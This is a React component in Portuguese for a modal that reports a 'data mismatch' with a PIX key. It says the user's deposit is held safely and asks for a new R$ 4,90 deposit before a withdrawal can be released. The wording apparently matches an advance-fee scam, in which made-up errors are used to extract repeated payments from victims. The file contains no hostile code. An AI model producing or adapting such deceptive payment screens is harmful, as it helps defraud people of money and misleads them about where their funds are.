import React from 'react';
import { AlertTriangle, Shield, ChevronRight } from 'lucide-react';

interface DataMismatchModalProps {
  isOpen: boolean;
  onReviewData: () => void;
  depositAmount: number;
}

export const DataMismatchModal: React.FC<DataMismatchModalProps> = ({
  isOpen,
  onReviewData,
  depositAmount
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/95 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
      <div className="bg-white rounded-2xl w-full max-w-sm shadow-2xl overflow-hidden animate-scale-in">

        <div className="bg-gradient-to-br from-orange-500 to-orange-600 p-5 text-center relative overflow-hidden">
          <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
            <AlertTriangle className="w-6 h-6 text-white" />
          </div>
          <h2 className="text-lg font-bold text-white mb-1">Dados Divergentes</h2>
          <p className="text-white/90 text-sm">Seu deposito esta seguro</p>
        </div>

        <div className="p-5">
          <div className="bg-orange-50 border-2 border-orange-200 rounded-xl p-4 mb-4">
            <div className="text-center mb-3">
              <div className="text-2xl font-bold text-orange-600 mb-1">
                R$ {depositAmount.toFixed(2).replace('.', ',')}
              </div>
              <p className="text-orange-700 text-xs font-medium">
                Valor recebido e guardado
              </p>
            </div>

            <div className="bg-white rounded-lg p-3 border border-orange-200">
              <p className="text-orange-800 text-sm leading-relaxed">
                Os dados cadastrados nao correspondem ao titular da chave PIX. Corrija para liberar o saque.
              </p>
            </div>
          </div>

          <div className="bg-blue-50 rounded-xl p-3 mb-4 border border-blue-200">
            <div className="flex items-start gap-2">
              <Shield className="w-4 h-4 text-blue-600 mt-0.5 flex-shrink-0" />
              <div>
                <p className="text-blue-800 text-xs leading-relaxed">
                  <span className="font-bold">Proximo passo:</span> Revise seus dados e faca um novo deposito de R$ 4,90. Ambos os valores serao creditados apos correcao.
                </p>
              </div>
            </div>
          </div>

          <button
            onClick={onReviewData}
            className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-4 rounded-xl hover:from-orange-600 hover:to-orange-700 transition-all duration-300 active:scale-95 shadow-lg mb-2"
            style={{ touchAction: 'manipulation' }}
          >
            <div className="flex items-center justify-center gap-2">
              <span>CORRIGIR DADOS</span>
              <ChevronRight className="w-5 h-5" />
            </div>
          </button>

          <p className="text-center text-gray-500 text-xs">
            Processo rapido e seguro
          </p>
        </div>
      </div>
    </div>
  );
};
